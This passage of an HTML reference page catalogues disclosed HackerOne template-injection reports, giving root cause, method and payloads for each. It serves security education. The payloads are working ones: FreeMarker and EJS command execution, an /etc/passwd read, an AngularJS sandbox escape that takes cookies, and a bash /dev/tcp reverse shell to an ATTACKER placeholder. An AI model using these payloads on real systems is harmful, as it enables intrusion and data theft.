+<h4>Method</h4><ol><li>GET the catalog-portal oauth verify endpoint</li><li>URL-encode a FreeMarker Execute payload into the deviceUdid parameter</li><li>Command output (e.g. /etc/passwd) is reflected in the error page / console.log tenant-code field</li></ol>
+<div class="pre">GET /catalog-portal/ui/oauth/verify?error=&amp;deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+# url-encoded deviceUdid=%24%7b%22freemarker.template.utility.Execute%22%3f%6e%65%77%28%29%28%22cat%20%2fetc%2fpasswd%22%29%7d</div>
+<p class="insight"><b>Insight —</b> Known-CVE hunting: fingerprint VMware Workspace ONE / Identity Manager and fire the FreeMarker Execute gadget at deviceUdid; output surfaces in the error page and in a console.log 'device id' field even on HTTP 400.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1537543" target="_blank" rel="noopener">hackerone.com/reports/1537543</a></span><a class="src" href="#report-1537543" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-423541" style="--sv:var(--sev-high)" data-sev="3" data-votes="409" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Handlebars SSTI in email templates -&gt; NodeJS RCE</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#423541</b> · shopify · awarded · 409 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-editable email templates (Return Magic) were rendered server-side with Handlebars without sandboxing; {{this.__proto__.constructor}} traversal reaches require/process for NodeJS code execution.</p>
+<h4>Method</h4><ol><li>Set a template value to {{this}} and send a test email; [object Object] confirms server-side templating</li><li>Probe prototype chain: {{this.__proto__}}, {{this.__proto__.constructor.name}} -&gt; Object (NodeJS)</li><li>Build the Handlebars RCE gadget via constructor/require to exec commands (see referenced write-up)</li></ol>
+<div class="pre">{{this}}
+{{this.__proto__}}
+{{this.__proto__.constructor.name}}
+// escalate to Handlebars RCE gadget: abuse constructor -&gt; require('child_process')</div>
+<p class="insight"><b>Insight —</b> Any place user input is echoed through an email/report template is an SSTI candidate. Fingerprint the engine with {{7*7}}/${7*7}/{7*7}, then walk __proto__.constructor in JS engines (Handlebars/Pug) to reach require.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/423541" target="_blank" rel="noopener">hackerone.com/reports/423541</a></span><a class="src" href="#report-423541" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-125980" style="--sv:var(--sev-high)" data-sev="3" data-votes="136" data-bounty="10000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Flask/Jinja2 SSTI in profile name</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#125980</b> · uber · 10000 · 136 votes · resolved</div>
+<div class="taxo"><span>Program <b>uber</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A profile name rendered through Flask/Jinja2 without sandboxing; {{7*7}} evaluates, and __class__.__base__.__subclasses__() traversal reaches Python objects for code execution (length-limited here).</p>
+<h4>Method</h4><ol><li>Set profile name to {{ '7'*7 }}; confirmation email shows 7777777</li><li>Enumerate classes via {{ [].__class__.__base__.__subclasses__() }}</li><li>Reach a subclass exposing os/subprocess (Popen) to run commands</li></ol>
+<div class="pre">{{ '7'*7 }}
+{{ [].__class__.__base__.__subclasses__() }}
+{{ ''.__class__.mro()[1].__subclasses__() }}
+{% for c in [1,2,3] %}{{c,c,c}}{% endfor %}</div>
+<p class="insight"><b>Insight —</b> SSTI surfaces where user text is later rendered server-side (emails, PDFs, notifications), not only on the reflected page. Fingerprint with {{7*7}} vs {7*7} vs ${7*7}; in Jinja2 walk __class__.__mro__ / __subclasses__ to Popen. Watch for length limits on the input field.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/125980" target="_blank" rel="noopener">hackerone.com/reports/125980</a></span><a class="src" href="#report-125980" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-164224" style="--sv:var(--sev-high)" data-sev="3" data-votes="122" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Smarty SSTI via {php} tags -&gt; PHP execution</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#164224</b> · unikrn · awarded · 122 votes · resolved</div>
+<div class="taxo"><span>Program <b>unikrn</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Profile fields were rendered by Smarty with {php} tags enabled, so raw PHP inside the template executes, giving file read and potential RCE.</p>
+<h4>Method</h4><ol><li>Set name fields to {7*7}; templated email returns 49 (Smarty injection)</li><li>Confirm engine/version with {$smarty.version}</li><li>Execute PHP with {php}...{/php}: print, then file_get_contents('/etc/passwd')</li><li>Trigger by inviting a friend so the template renders in the email</li></ol>
+<div class="pre">{$smarty.version}
+{php}print "Hello";{/php}
+{php}$s = file_get_contents('/etc/passwd',NULL,NULL,0,100); var_dump($s);{/php}</div>
+<p class="insight"><b>Insight —</b> Smarty {7*7}-&gt;49 and {$smarty.version} are the tells; {php} tags (or registered modifiers) escalate to arbitrary PHP. Any profile field echoed into an invite/notification email is the delivery vector.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/164224" target="_blank" rel="noopener">hackerone.com/reports/164224</a></span><a class="src" href="#report-164224" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1104349" style="--sv:var(--sev-high)" data-sev="3" data-votes="26" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Blind SSTI in signup name rendered in welcome email</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1104349</b> · glovo · none · 26 votes · resolved</div>
+<div class="taxo"><span>Program <b>glovo</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The First Name field from registration is embedded into a server-side email template unsanitized, so template syntax entered there is evaluated when the welcome/promotional email is generated.</p>
+<h4>Method</h4><ol><li>Register with a template probe in the name field</li><li>Wait for the automated welcome/promo email</li><li>If {{7*7}} renders as 49 in the subject/body, the mail template engine evaluates user input</li></ol>
+<div class="pre">First Name: {{7*7}}
+# email subject arrives: '49, welcome to Glovo!'</div>
+<p class="insight"><b>Insight —</b> Profile fields (name, company) that later surface in transactional/marketing emails are an out-of-band SSTI surface; the render happens asynchronously in the mail pipeline, so probe and check the delivered email, not the HTTP response.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1104349" target="_blank" rel="noopener">hackerone.com/reports/1104349</a></span><a class="src" href="#report-1104349" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-271960" style="--sv:var(--sev-med)" data-sev="2" data-votes="15" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>AngularJS client-side template injection exfiltrating scope via avatar URL</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#271960</b> · rockstargames · awarded · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>rockstargames</b></span><span>Surface <b>web</b></span><span>Chain <b>CSTI -&gt; $scope read -&gt; avatar-URL GET exfiltration of </b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User input reflected into an AngularJS-bound DOM region is evaluated as an Angular expression (CSTI), giving access to the whole $scope; sensitive data (email, userid, tokens) can be read via childHead/nextSibling traversal and exfiltrated by rewriting a victim's avatar image URL to an attacker server (data leaves via a plain GET, no XSS needed).</p>
+<h4>Method</h4><ol><li>Inject {{ }} Angular expression into a reflected field (here a search field) and confirm evaluation (e.g. {{7*7}})</li><li>Walk the scope via $$childHead/$$nextSibling to reach user data (email/userid/token)</li><li>Set the victim avatar/image src to https://attacker/?d=&lt;data&gt; so the browser leaks scope data over a GET</li></ol>
+<div class="pre">{{7*7}}   // confirm CSTI
+// then read scope and set an image URL to attacker host to exfil email/userid/token</div>
+<p class="insight"><b>Insight —</b> CSTI is not only an XSS vector: even under Angular sandboxing you can read $scope and exfiltrate via any attribute that issues a request (img/avatar src). Test every reflected field with {{7*7}}/{{constructor...}} on Angular apps; ng-non-bindable is the fix. Programs may misclassify CSTI as reflected XSS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/271960" target="_blank" rel="noopener">hackerone.com/reports/271960</a></span><a class="src" href="#report-271960" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-230232" style="--sv:var(--sev-low)" data-sev="1" data-votes="15" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client-side template injection (AngularJS) via profile/address fields</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#230232</b> · wordpress · awarded · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>wordpress</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled account/address fields are stored and later rendered inside an AngularJS-bound (ng-*) region, so {{...}} expressions are evaluated as template code — client-side template injection that can escalate toward XSS/sandbox escape.</p>
+<h4>Method</h4><ol><li>Locate a page with ng-app/ng-bindable rendering user data</li><li>Enter template expressions ({{1+1}}, {{1==1}}) into profile/address fields</li><li>Reach the page that renders them (checkout) and confirm evaluation (2 / true)</li></ol>
+<div class="pre">{{1+1}}
+{{1==1}}
+(escalate with AngularJS sandbox-escape payloads to run JS)</div>
+<p class="insight"><b>Insight —</b> Test stored fields with {{7*7}} anywhere data is later shown inside an Angular/Vue/Handlebars context. Evaluation to 49/true confirms CSTI; presence of ng-* attributes near your reflection is the tell. Portswigger's client-side template injection research applies.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/230232" target="_blank" rel="noopener">hackerone.com/reports/230232</a></span><a class="src" href="#report-230232" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3122019" style="--sv:var(--sev-none)" data-sev="0" data-votes="66" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>RCE via raw template rendering (@fastify/view reply.view({raw}) + EJS)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#3122019</b> · fastify · none · 66 votes · resolved</div>
+<div class="taxo"><span>Program <b>fastify</b></span><span>Surface <b>web</b></span><span>Chain <b>SSTI -&gt; RCE</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">reply.view({ raw: &lt;string&gt; }) passes the string straight to EJS's compile(), so any user-controlled content rendered as a raw template executes arbitrary Node/OS code.</p>
+<h4>Method</h4><ol><li>Find an endpoint that renders user-influenced content as a raw template (comments, filenames, email bodies)</li><li>Inject an EJS scriptlet that calls child_process</li><li>Trigger rendering -&gt; command executes on the server</li></ol>
+<div class="pre">&lt;%= require("child_process").execSync("id").toString() %&gt;
+
+// reverse shell
+&lt;%= require("child_process").execSync("bash -i &gt;&amp; /dev/tcp/ATTACKER/4444 0&gt;&amp;1") %&gt;</div>
+<p class="insight"><b>Insight —</b> Any framework primitive that renders raw/attacker-supplied strings as templates (raw:, renderString, compile on input) is SSTI-&gt;RCE. Grep server code for template compile calls fed by request data.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3122019" target="_blank" rel="noopener">hackerone.com/reports/3122019</a></span><a class="src" href="#report-3122019" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-141463" style="--sv:var(--sev-none)" data-sev="0" data-votes="20" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>AngularJS client-side template injection (CSTI) to XSS/ATO</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#141463</b> · drchrono · awarded · 20 votes · resolved</div>
+<div class="taxo"><span>Program <b>drchrono</b></span><span>Surface <b>web</b></span><span>Chain <b>stored CSTI in referral contact -&gt; admin views page -&gt;</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User input stored in a field is later rendered inside an AngularJS-bound region, so template expressions are evaluated; on Angular 1.1.5 constructor.constructor escapes the expression sandbox to run arbitrary JS.</p>
+<h4>Method</h4><ol><li>In a stored field enter a math expression to detect evaluation</li><li>Confirm it computes (e.g. [[5*5]] renders 25) and read angular.version in console</li><li>Submit a sandbox-escape payload; reload the page to trigger stored XSS</li></ol>
+<div class="pre">detect:  [[5*5]]  -&gt; 25
+exploit (Angular 1.1.5, {{}} interpolation remapped to [[ ]]):  [[constructor.constructor('alert(document.cookie)')()]]</div>
+<p class="insight"><b>Insight —</b> When a value is echoed inside an Angular app, test with the interpolation delimiters ({{7*7}} or [[7*7]]) - arithmetic evaluation means CSTI, not just reflected XSS. Then use the version-specific sandbox escape (constructor.constructor) to run JS. Low-priv stored input viewed by an admin -&gt; full ATO.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/141463" target="_blank" rel="noopener">hackerone.com/reports/141463</a></span><a class="src" href="#report-141463" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-98259" style="--sv:var(--sev-none)" data-sev="0" data-votes="6" data-bounty="1500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Shopify Liquid Drop method exposure -&gt; info disclosure / limited RCE</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#98259</b> · shopify · USD 1500 · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Liquid templates in admin-editable areas (notification/checkout templates) expose real Ruby methods and properties of Drop objects, so a template author can call no-arg methods and read otherwise-hidden fields via to_yaml.</p>
+<h4>Method</h4><ol><li>Edit an email/checkout Liquid template (e.g. New Order notification)</li><li>Insert Liquid that enumerates and calls object methods</li><li>Preview to render the output (leaks hidden fields such as password hashes)</li></ol>
+<div class="pre">{{ methods | json }}
+{{ systemu }}
+{{ class }}
+{{ to_yaml }}</div>
+<p class="insight"><b>Insight —</b> When testing template engines, enumerate the object graph: probes like {{ class }}, {{ methods }}, {{ to_yaml }} reveal exposed Ruby methods; to_yaml dumps hidden attributes. No-arg method access can escalate toward RCE if any dangerous method (systemu/instance_eval) is reachable.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/98259" target="_blank" rel="noopener">hackerone.com/reports/98259</a></span><a class="src" href="#report-98259" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-942103" style="--sv:var(--sev-none)" data-sev="0" data-votes="5" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Rails render inline: with user input -&gt; ERB SSTI/RCE</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#942103</b> · rails · none · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>rails</b></span><span>Surface <b>web</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An endpoint passes a request parameter straight to `render inline: params[:content]`, which compiles and evaluates the string as an ERB template, so embedded Ruby executes on the server.</p>
+<h4>Method</h4><ol><li>Find a response that reflects input where render inline / ERB.new / Liquid-style rendering is used</li><li>Submit an ERB expression payload</li><li>Observe server-side evaluation (command output / file effect)</li></ol>
+<div class="pre"># request param 'content':
+&lt;% `touch me` %&gt;
+# url-encoded:
+%3C%25%20%60touch%20me%60%20%25%3E</div>
+<p class="insight"><b>Insight —</b> Whenever user input reaches a template renderer (Rails render inline:, ERB.new, Jinja, Twig), test the language's expression syntax first (&lt;%= 7*7 %&gt;, {{7*7}}). Rails `render inline:` on any request-derived string is an immediate RCE primitive — grep controllers for `render inline:` / `render text:` fed by params.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/942103" target="_blank" rel="noopener">hackerone.com/reports/942103</a></span><a class="src" href="#report-942103" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">Server-side template injection labs</a> (hands-on practice).</li>
+<li>All 14 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#detection-fingerprinting">Detection &amp; fingerprinting</a><a href="#technique-variants">Technique variants</a><a href="#python-jinja2-twig-style" style="padding-left:24px">↳ Python — Jinja2 / Twig-style {{ }}</a><a href="#nodejs-handlebars-pug-ejs" style="padding-left:24px">↳ NodeJS — Handlebars / Pug / EJS</a><a href="#ruby-erb-render-inline" style="padding-left:24px">↳ Ruby — ERB (render inline:)</a><a href="#php-smarty-php" style="padding-left:24px">↳ PHP — Smarty {php}</a><a href="#java-freemarker-velocity-ognl" style="padding-left:24px">↳ Java — FreeMarker / Velocity / OGNL</a><a href="#client-side-angularjs-csti" style="padding-left:24px">↳ Client-side — AngularJS (CSTI)</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (14)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ PortSwigger: Server-side template injection</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
